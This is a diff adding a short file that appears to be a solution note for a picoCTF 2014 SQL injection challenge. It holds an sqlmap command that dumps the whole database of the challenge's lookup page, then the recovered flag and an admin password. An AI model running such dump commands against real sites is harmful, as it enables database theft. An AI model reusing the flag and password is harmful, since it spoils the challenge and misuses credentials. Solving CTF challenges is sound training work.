@@ -1,0 +1,5 @@
+sqlmap -u "http://web2014.picoctf.com/injection3/lookup_user.php?id=1" --dump-all
+
+
+flag: flag_2tc7ZPa5PEhcyZJXgH
+password: not_the_flag_super_secret_admin_password
